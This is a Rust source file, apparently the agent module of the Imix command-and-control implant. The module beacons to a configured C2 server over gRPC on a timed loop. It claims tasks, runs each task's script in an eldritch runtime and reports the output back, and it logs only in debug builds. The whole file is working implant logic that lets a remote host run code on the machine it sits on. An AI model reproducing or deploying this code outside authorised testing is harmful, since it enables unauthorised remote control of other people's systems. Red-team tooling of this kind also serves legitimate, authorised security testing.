use crate::{config::Config, task::TaskHandle};
use anyhow::Result;
use pb::c2::ClaimTasksRequest;
use std::time::{Duration, Instant};
use transport::{Transport, GRPC};

/*
 * Agent contains all relevant logic for managing callbacks to a c2 server.
 * It is responsible for obtaining tasks, executing them, and returning their output.
 */
pub struct Agent {
    cfg: Config,
    handles: Vec<TaskHandle>,
}

impl Agent {
    /*
     * Initialize an agent using the provided configuration.
     */
    pub fn new(cfg: Config) -> Result<Self> {
        Ok(Agent {
            cfg,
            handles: Vec::new(),
        })
    }

    // Claim tasks and start their execution
    async fn claim_tasks(&mut self, mut tavern: GRPC) -> Result<()> {
        let tasks = tavern
            .claim_tasks(ClaimTasksRequest {
                beacon: Some(self.cfg.info.clone()),
            })
            .await?
            .tasks;

        #[cfg(debug_assertions)]
        if !tasks.is_empty() {
            log::info!("{} tasks claimed", tasks.len());
        }

        for task in tasks {
            let tome = match task.tome {
                Some(t) => t,
                None => {
                    continue;
                }
            };

            let runtime = eldritch::start(task.id, tome).await;
            self.handles.push(TaskHandle::new(task.id, runtime));

            #[cfg(debug_assertions)]
            log::info!("spawned task execution for id={}", task.id);
        }
        Ok(())
    }

    // Report task output, remove completed tasks
    async fn report(&mut self, mut tavern: GRPC) -> Result<()> {
        // Report output from each handle
        let mut idx = 0;
        while idx < self.handles.len() {
            // Drop any handles that have completed
            if self.handles[idx].is_finished() {
                let mut handle = self.handles.remove(idx);
                handle.report(&mut tavern).await?;
                continue;
            }

            // Otherwise report and increment
            self.handles[idx].report(&mut tavern).await?;
            idx += 1;
        }

        Ok(())
    }

    /*
     * Callback once using the configured client to claim new tasks and report available output.
     */
    pub async fn callback(&mut self) -> Result<()> {
        let transport = GRPC::new(
            self.cfg.callback_uri.clone(),
            self.cfg.server_pubkey,
            self.cfg.proxy_uri.clone(),
        )?;
        self.claim_tasks(transport.clone()).await?;
        self.report(transport.clone()).await?;

        Ok(())
    }

    /*
     * Callback indefinitely using the configured client to claim new tasks and report available output.
     */
    pub async fn callback_loop(&mut self) -> Result<()> {
        loop {
            let start = Instant::now();

            // Sometimes Imix starts too quickly in a boot sequence, a NIC is down during the initial callback,
            // or the box Imix is on changes its IP. In any case, for each callback we should refresh our claimed
            // IP.
            self.cfg.refresh_primary_ip();

            match self.callback().await {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("callback failed: {}", _err);
                }
            };

            let interval = self.cfg.info.interval;
            let delay = match interval.checked_sub(start.elapsed().as_secs()) {
                Some(secs) => Duration::from_secs(secs),
                None => Duration::from_secs(0),
            };

            #[cfg(debug_assertions)]
            log::info!(
                "callback complete (duration={}s, sleep={}s)",
                start.elapsed().as_secs(),
                delay.as_secs()
            );

            std::thread::sleep(delay);
        }
    }
}
